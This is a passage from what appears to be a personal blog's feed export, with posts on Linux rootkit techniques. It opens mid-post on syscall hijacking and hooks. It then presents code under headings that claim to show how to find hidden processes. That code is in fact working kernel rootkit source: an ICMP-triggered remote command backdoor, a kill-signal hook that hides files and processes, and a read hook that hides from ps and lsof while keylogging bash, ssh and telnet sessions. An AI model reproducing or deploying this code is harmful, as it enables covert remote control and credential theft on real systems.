handler, by modifying 0x1 interrupt Of the processing program can achieve the desired <span class="keyword">function</span>.</div><div class="line"></div><div class="line">Hijacking system call: and intercept interrupt similar, but mainly on the system call table to modify, you can directly replace the original system call table, you can also modify the system call table entry address. Before the 2.4 kernel, the kernel<span class="string">'s system call table address is exported, so it can be modified directly. But in the 2.6 kernel, the system call table address is no longer exported, the need to 0x80 interrupt handler to obtain the system call table to obtain the address.</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">Run-time patch: character device driver and block device driver will load the system to register a Struct file_operations structure to achieve the specified read, write and other operations, the file system is the case, by modifying the file system file_operations structure, you can achieve the new read, write operation and so on.</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">inline hook: mainly refers to the kernel function in memory directly modify, without affecting the original function, you can use the jump method, you can also modify the call to the lower function implementation.</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">Port bounce: mainly in order to better break through the firewall restrictions, you can monitor the client port 80, and the server through the client'</span>s port 80 back, disguised as a visit to the normal process of web services to <span class="built_in">break</span> through the firewall <span class="built_in">limit</span>.</div><div class="line">&lt;!-- more --&gt;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Intermittent learning process do not understand slowly learn a lot, although for Rootkid it is only worth mentioning the fur content but 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Vita</title>
    <link href="http://yoursite.com/2017/09/28/new%208/"/>
    <id>http://yoursite.com/2017/09/28/new 8/</id>
    <published>2017-09-27T20:39:48.500Z</published>
    <updated>2017-10-13T15:50:58.446Z</updated>
    
    <content type="html"><![CDATA[<p>The OS summary!The OS summary!The OS summary!The OS summary!</p><h2 id="The-OS-summary"><a href="#The-OS-summary" class="headerlink" title="The OS summary"></a>The OS summary</h2><h3 id="This-is-a-bolg-that-can-make-you-know-more-about-OS"><a href="#This-is-a-bolg-that-can-make-you-know-more-about-OS" class="headerlink" title="This is a bolg that can make you know more about OS"></a>This is a bolg that can make you know more about OS</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Too much details,so finally I give a link that I find from CSDN!</div></pre></td></tr></table></figure><p>More info: <a href="http://blog.csdn.net/basycia/article/details/52280086" target="_blank" rel="external">Click here</a></p><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;The OS summary!The OS summary!The OS summary!The OS summary!&lt;/p&gt;
&lt;h2 id=&quot;The-OS-summary&quot;&gt;&lt;a href=&quot;#The-OS-summary&quot; class=&quot;headerlink&quot; title=&quot;The OS summary&quot;&gt;&lt;/a&gt;The OS summary&lt;/h2&gt;&lt;h3 id=&quot;This-is-a-bolg-that-can-make-you-know-more-about-OS&quot;&gt;&lt;a href=&quot;#This-is-a-bolg-that-can-make-you-know-more-about-OS&quot; class=&quot;headerlink&quot; title=&quot;This is a bolg that can make you know more about OS&quot;&gt;&lt;/a&gt;This is a bolg that can make you know more about OS&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;Too much details,so finally I give a link that I find from CSDN!&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;a href=&quot;http://blog.csdn.net/basycia/article/details/52280086&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Click here&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>The study of how to solve rookitd record!</title>
    <link href="http://yoursite.com/2017/09/23/new7/"/>
    <id>http://yoursite.com/2017/09/23/new7/</id>
    <published>2017-09-23T10:52:34.421Z</published>
    <updated>2017-10-13T15:52:43.033Z</updated>
    
    <content type="html"><![CDATA[<p>First define an array of 64 elements that need to hide the process prefix [MAX_PREFIX]<br>Then define a filldir hook () function (ps: first, vfs_readir callback function (exact should be called filldir_t filler);<br>Second, sys_getdents is passed to the callback function of vfs_readdir.<br>filldir_t filler is in the various vfs_readir internal callback, by the various fs internal read_dir implementation to complete the directory traversal operation,<br>For each file or subdirectory traversed, callback filler to fill buf) hook the process callback function fill value, when the fill value is equal to the hidden<br>The process number of the stored process (ps: the process character name is converted to a corresponding integer by the kstrtouint () function).<br>prefix [MAX_PREFIX].<br>Finally, in the need to hide the main function of the process in order to scan prefix [MAX_PREFIX], when the scan is not 0 when the value of the process is that we<br>Need to hide the process, return directly, do not return to the buffer. If it is 0, then we do not need to hide the process is not necessary to hide<br>Possession of the process, to the real <code>filldir</code> fill in the buffer.</p><p>Ps: Since the process is always created by the parent process, and the child process can create a child process, so the process is a tree, and rootkid through the hook function<br>Make the rootkid want to hide the process by the system call readir function callback function does not return to the process buffer, in fact, is a broken tree<br>Bad, making the real system process tree becomes incomplete</p><p>because someone will use this way to attack the others ,I only give the Prevention method to who is interested in this!!!</p><h2 id="The-first-situation"><a href="#The-first-situation" class="headerlink" title="The first situation"></a>The first situation</h2><h3 id="How-to-find-hidden-process"><a href="#How-to-find-hidden-process" class="headerlink" title="How to find hidden process"></a>How to find hidden process</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div></pre></td><td class="code"><pre><div class="line">/* execute cmds hidden <span class="keyword">in</span> icmp <span class="built_in">echo</span> packet */</div><div class="line">unsigned int icmp_hook(</div><div class="line"><span class="comment">#if LINUX_VERSION_CODE &lt; KERNEL_VERSION(3,13,0)</span></div><div class="line">        unsigned int hooknum,</div><div class="line"><span class="comment">#else</span></div><div class="line">        const struct nf_hook_ops *ops,</div><div class="line"><span class="comment">#endif</span></div><div class="line">        struct sk_buff *skb,</div><div class="line">        const struct net_device *<span class="keyword">in</span>,</div><div class="line">        const struct net_device *out,</div><div class="line">        int (*okfn)(struct sk_buff *))</div><div class="line">&#123;</div><div class="line">    struct icmphdr *icmph;</div><div class="line">    struct iphdr   *iph;</div><div class="line">    char *data, *cmd;</div><div class="line">    int cmdlen, passlen;</div><div class="line"></div><div class="line">    icmph = icmp_hdr(skb);</div><div class="line">    data = (char *)icmph + 8;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (icmph &amp;&amp; icmph-&gt;<span class="built_in">type</span> == ICMP_ECHO &amp;&amp;</div><div class="line">            !strncmp(rce_pass, data, passlen=strlen(rce_pass))) &#123;</div><div class="line"></div><div class="line">        /* get ip header */</div><div class="line">        iph = ip_hdr(skb);</div><div class="line"></div><div class="line">        /* calculate cmd length */</div><div class="line">        cmdlen = __be16_to_cpu(iph-&gt;tot_len) - iph-&gt;ihl * 4</div><div class="line">            - /*icmp header*/ 8 - passlen - /*space after password*/ 1;</div><div class="line">        FDEBUG(<span class="string">"total len: %d\theader len: %d\tpasslen: %d\n"</span>,</div><div class="line">                __be16_to_cpu(iph-&gt;tot_len), iph-&gt;ihl, passlen);</div><div class="line"></div><div class="line">        /* get cmd string */</div><div class="line">        cmd = rce_cmd;</div><div class="line">        memcpy(cmd, data+passlen+1, cmdlen);</div><div class="line">        cmd[cmdlen] = <span class="string">'\0'</span>;</div><div class="line">        argv[2] = cmd;</div><div class="line"></div><div class="line">        FDEBUG(<span class="string">"Cmd (%d bytes): %s\n"</span>, cmdlen, cmd);</div><div class="line">        </div><div class="line">        /* start userspace <span class="built_in">command</span> */</div><div class="line">        call_usermodehelper(argv[0], argv, NULL, UMH_NO_WAIT);</div><div class="line"></div><div class="line">        goto drop;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">return</span> NF_ACCEPT;</div><div class="line"></div><div class="line">drop:</div><div class="line">    <span class="built_in">return</span> NF_DROP;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/* netfilter hook struct */</div><div class="line">struct nf_hook_ops nfhook = &#123;</div><div class="line">    .owner      = THIS_MODULE,</div><div class="line">    .hook       = icmp_hook,</div><div class="line">    .pf         = PF_INET,</div><div class="line">    .hooknum    = NF_INET_LOCAL_IN,</div><div class="line">    .priority   = NF_IP_PRI_FIRST,</div><div class="line">&#125;;</div><div class="line"></div><div class="line">int rce_init(void)</div><div class="line">&#123;</div><div class="line">    <span class="built_in">return</span> nf_register_hook(&amp;nfhook);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void rce_exit(void)</div><div class="line">&#123;</div><div class="line">    nf_unregister_hook(&amp;nfhook);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">/***********************</div><div class="line"> * rootkit control</div><div class="line"> ***********************/</div><div class="line"></div><div class="line">/* <span class="built_in">kill</span> hook */</div><div class="line">asmlinkage long sys_kill(pid_t pid, int sig)</div><div class="line">&#123;</div><div class="line">    switch (sig) &#123;</div><div class="line">        <span class="keyword">case</span> SIGRTMAX:  /* rootkit control */</div><div class="line">            switch (pid) &#123;</div><div class="line">                <span class="keyword">case</span> 0:</div><div class="line">                    file_hide_start();</div><div class="line">                    <span class="built_in">break</span>;</div><div class="line"></div><div class="line">                <span class="keyword">case</span> 1:</div><div class="line">                    file_hide_stop();</div><div class="line">                    <span class="built_in">break</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="built_in">break</span>;</div><div class="line"></div><div class="line">        <span class="keyword">case</span> SIGRTMAX-1:  /* hide process */</div><div class="line">            <span class="keyword">if</span> (pid == 0)</div><div class="line">                reveal_all_pids();</div><div class="line">            <span class="keyword">else</span></div><div class="line">                hide_pid(pid);</div><div class="line">            <span class="built_in">break</span>;</div><div class="line"></div><div class="line">        default:</div><div class="line">            <span class="built_in">return</span> ((asmlinkage long (*)(pid_t, int))old_kill)(pid, sig);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">return</span> 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>Welcome to communicate: <a href="https://762131828@qq.com" target="_blank" rel="external">Server</a></p><h2 id="The-second-situation"><a href="#The-second-situation" class="headerlink" title="The second situation"></a>The second situation</h2><h3 id="Change-the-system’ps-and-pstree"><a href="#Change-the-system’ps-and-pstree" class="headerlink" title="Change the system’ps and pstree!"></a>Change the system’ps and pstree!</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div></pre></td><td class="code"><pre><div class="line">inkage int h4x_read(unsigned int fd, char __user *buf, size_t count)</div><div class="line">&#123;</div><div class="line">  int i,r;</div><div class="line">  char date_time[24];</div><div class="line">  char *kbuf=(char*)kmalloc(256,GFP_KERNEL);</div><div class="line"></div><div class="line">  /*If output is redirected to file or grep, hide it*/</div><div class="line">  copy_from_user(kbuf,buf,255);</div><div class="line">  <span class="keyword">if</span> ((strstr(current-&gt;comm,<span class="string">"ps"</span>))||(strstr(current-&gt;comm,<span class="string">"pstree"</span>))||</div><div class="line">      (strstr(current-&gt;comm,<span class="string">"top"</span>))||(strstr(current-&gt;comm,<span class="string">"lsof"</span>)))&#123;</div><div class="line">    <span class="keyword">if</span>(strstr(kbuf,_H4X0R_)||strstr(kbuf,KBEAST))</div><div class="line">    &#123;</div><div class="line">      kfree(kbuf);</div><div class="line">      <span class="built_in">return</span> -ENOENT;</div><div class="line">    &#125;</div><div class="line">  &#125; </div><div class="line"> </div><div class="line">  r=o_read(fd,buf,count);</div><div class="line">  /*Due to stability issue, we <span class="built_in">limit</span> the keylogging process*/</div><div class="line">  <span class="keyword">if</span>((strcmp(current-&gt;comm,<span class="string">"bash"</span>) == 0) || (strcmp(current-&gt;comm,<span class="string">"ssh"</span>) == 0)||</div><div class="line">     (strcmp(current-&gt;comm,<span class="string">"scp"</span>) == 0) || (strcmp(current-&gt;comm,<span class="string">"telnet"</span>) == 0)||</div><div class="line">     (strcmp(current-&gt;comm,<span class="string">"rsh"</span>) == 0) || (strcmp(current-&gt;comm,<span class="string">"rlogin"</span>) == 0))&#123;    </div><div class="line">    /*SPECIAL CHAR*/</div><div class="line">    <span class="keyword">if</span> (counter) &#123;</div><div class="line">      <span class="keyword">if</span> (counter == 2) &#123;  // Arrows + Break</div><div class="line">        //left arrow</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x44) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[LEFT]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //right arrow</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x43) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[RIGHT]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //up arrow</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x41) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[UP]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //down arrow</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x42) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[DOWN]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //<span class="built_in">break</span></div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x50) &#123;</div><div class="line">  strcat(ibuffer,<span class="string">"[BREAK]"</span>);</div><div class="line">  counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //numlock</div><div class="line">        <span class="keyword">if</span>(buf[0] == 0x47) &#123;</div><div class="line">  strcat (ibuffer,<span class="string">"[NUMLOCK]"</span>);</div><div class="line">  counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        strncpy (spbuffer,buf,1);</div><div class="line">        counter ++;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">  </div><div class="line">      <span class="keyword">if</span> (counter == 3) &#123;   // F1-F5</div><div class="line">        //F1</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x41) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[F1]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //F2</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x42) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[F2]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //F3</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x43) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[F3]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //F4</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x44) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[F4]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //F5</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x45) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[F5]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x7E) &#123;     // PgUp, PgDown, Ins, ...</div><div class="line">          //Page Up</div><div class="line">          <span class="keyword">if</span> (spbuffer[0] == 0x35)</div><div class="line">            strcat(ibuffer,<span class="string">"[PGUP]"</span>);</div><div class="line">          //Page Down</div><div class="line">          <span class="keyword">if</span> (spbuffer[0] == 0x36)</div><div class="line">            strcat(ibuffer,<span class="string">"[PGDN]"</span>);</div><div class="line">          //Delete</div><div class="line">          <span class="keyword">if</span> (spbuffer[0] == 0x33)</div><div class="line">            strcat(ibuffer,<span class="string">"[DELETE]"</span>);</div><div class="line">          //End</div><div class="line">          <span class="keyword">if</span> (spbuffer[0] == 0x34)</div><div class="line">            strcat(ibuffer,<span class="string">"[END]"</span>);</div><div class="line">          //Home</div><div class="line">          <span class="keyword">if</span> (spbuffer[0] == 0x31)</div><div class="line">            strcat(ibuffer,<span class="string">"[HOME]"</span>);</div><div class="line">          //Insert</div><div class="line">          <span class="keyword">if</span> (spbuffer[0] == 0x32)</div><div class="line">            strcat(ibuffer,<span class="string">"[INSERT]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (spbuffer[0] == 0x31) &#123;  // F6-F8</div><div class="line">          //F6</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x37)</div><div class="line">            strcat(ibuffer,<span class="string">"[F6]"</span>);</div><div class="line">          //F7</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x38)</div><div class="line">            strcat(ibuffer,<span class="string">"[F7]"</span>);</div><div class="line">          //F8</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x39)</div><div class="line">            strcat(ibuffer,<span class="string">"[F8]"</span>);</div><div class="line">          counter++;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">  </div><div class="line">        <span class="keyword">if</span> (spbuffer[0] == 0x32) &#123; // F9-F12</div><div class="line">          //F9</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x30)</div><div class="line">            strcat(ibuffer,<span class="string">"[F9]"</span>);</div><div class="line">          //F10</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x31)</div><div class="line">            strcat(ibuffer,<span class="string">"[F10]"</span>);</div><div class="line">          //F11</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x33)</div><div class="line">            strcat(ibuffer,<span class="string">"[F11]"</span>);</div><div class="line">          //F12</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x34)</div><div class="line">            strcat(ibuffer,<span class="string">"[F12]"</span>);</div><div class="line">  </div><div class="line">          counter++;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">  </div><div class="line">      <span class="keyword">if</span>(counter &gt;= 4) &#123;  //WatchDog</div><div class="line">        counter = 0;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">  </div><div class="line">      counter ++;</div><div class="line">      goto END;</div><div class="line">    &#125;</div><div class="line">  </div><div class="line">    /*SH, SSHD = 0 /TELNETD = 3/LOGIN = 4*/</div><div class="line">    <span class="keyword">if</span>(r==1 &amp;&amp; (fd==0||fd==3||fd==4))&#123;</div><div class="line">      //CTRL+U</div><div class="line">      <span class="keyword">if</span>(buf[0]==0x15)&#123; </div><div class="line">        ibuffer[0]=<span class="string">'\0'</span>;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">      //TAB</div><div class="line">      <span class="keyword">if</span>(buf[0]==0x09)&#123;</div><div class="line">        strcat(ibuffer,<span class="string">"[TAB]"</span>);</div><div class="line">        counter = 0;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">      //CTRL+C</div><div class="line">      <span class="keyword">if</span>(buf[0]==0x03)&#123;</div><div class="line">        strcat(ibuffer,<span class="string">"[CTRL+C]"</span>);</div><div class="line">        counter = 0;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">      //CTRL+D</div><div class="line">      <span class="keyword">if</span>(buf[0]==0x03)&#123;</div><div class="line">        strcat(ibuffer,<span class="string">"[CTRL+D]"</span>);</div><div class="line">        counter = 0;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">      //CTRL+]</div><div class="line">      <span class="keyword">if</span>(buf[0]==0x1D)&#123;</div><div class="line">        strcat(ibuffer,<span class="string">"[CTRL+]]"</span>);</div><div class="line">        counter = 0;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">      //BACKSPACE 0x7F Local / 0x08 Remote</div><div class="line">      <span class="keyword">if</span> (buf[0] == 0x7F || buf[0] == 0x08) &#123;</div><div class="line">        <span class="keyword">if</span> (ibuffer[strlen(ibuffer) - 1] == <span class="string">']'</span>) &#123;</div><div class="line">          <span class="keyword">for</span> (i=2;strlen(ibuffer);i++)&#123;</div><div class="line">            <span class="keyword">if</span> (ibuffer[strlen (ibuffer) - i] == <span class="string">'['</span>) &#123;</div><div class="line">              ibuffer[strlen(ibuffer) - i] = <span class="string">'\0'</span>;</div><div class="line">              <span class="built_in">break</span>;</div><div class="line">            &#125;</div><div class="line">          &#125;</div><div class="line">          goto END;</div><div class="line">        &#125;<span class="keyword">else</span> &#123;</div><div class="line">          ibuffer[strlen(ibuffer) - 1] = <span class="string">'\0'</span>;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">  </div><div class="line">      <span class="keyword">if</span> (buf[0] == 0x1B) &#123;</div><div class="line">        counter++;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">if</span>(buf[0] != <span class="string">'\n'</span> &amp;&amp; buf[0] != <span class="string">'\r'</span>)&#123;</div><div class="line">        strncat(ibuffer,buf,sizeof(ibuffer));</div><div class="line">      &#125;<span class="keyword">else</span>&#123;</div><div class="line">        strcat(ibuffer,<span class="string">"\n"</span>);</div><div class="line">        get_time(date_time);</div><div class="line">        snprintf(obuffer,sizeof(obuffer),<span class="string">"[%s] - [UID = %i ] %s &gt; %s"</span>,date_time,current_uid(),current-&gt;comm,ibuffer);</div><div class="line">//I don<span class="string">'t want to log buffer more than 60 chars, most of them are useless data</span></div><div class="line"><span class="string">        if(strlen(ibuffer)&lt;60) &#123;</span></div><div class="line"><span class="string">          log_to_file(obuffer);</span></div><div class="line"><span class="string">        &#125;</span></div><div class="line"><span class="string">        ibuffer[0]='</span>\0<span class="string">';</span></div><div class="line"><span class="string">      &#125;</span></div><div class="line"><span class="string">    &#125;</span></div><div class="line"><span class="string">  &#125;</span></div><div class="line"><span class="string">  END:</span></div><div class="line"><span class="string">  return r;</span></div><div class="line"><span class="string">&#125;</span></div></pre></td></tr></table></figure><p>Welcome to communicate: <a href="https://762131828@qq.com" target="_blank" rel="external">Server</a><br><a id="more"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;First define an array of 64 elements that need to hide the process prefix [MAX_PREFIX]&lt;br&gt;Then define a filldir hook () function (ps: first, vfs_readir callback function (exact should be called filldir_t filler);&lt;br&gt;Second, sys_getdents is passed to the callback function of vfs_readdir.&lt;br&gt;filldir_t filler is in the various vfs_readir internal callback, by the various fs internal read_dir implementation to complete the directory traversal operation,&lt;br&gt;For each file or subdirectory traversed, callback filler to fill buf) hook the process callback function fill value, when the fill value is equal to the hidden&lt;br&gt;The process number of the stored process (ps: the process character name is converted to a corresponding integer by the kstrtouint () function).&lt;br&gt;prefix [MAX_PREFIX].&lt;br&gt;Finally, in the need to hide the main function of the process in order to scan prefix [MAX_PREFIX], when the scan is not 0 when the value of the process is that we&lt;br&gt;Need to hide the process, return directly, do not return to the buffer. If it is 0, then we do not need to hide the process is not necessary to hide&lt;br&gt;Possession of the process, to the real &lt;code&gt;filldir&lt;/code&gt; fill in the buffer.&lt;/p&gt;
&lt;p&gt;Ps: Since the process is always created by the parent process, and the child process can create a child process, so the process is a tree, and rootkid through the hook function&lt;br&gt;Make the rootkid want to hide the process by the system call readir function callback function does not return to the process buffer, in fact, is a broken tree&lt;br&gt;Bad, making the real system process tree becomes incomplete&lt;/p&gt;
&lt;p&gt;because someone will use this way to attack the others ,I only give the Prevention method to who is interested in this!!!&lt;/p&gt;
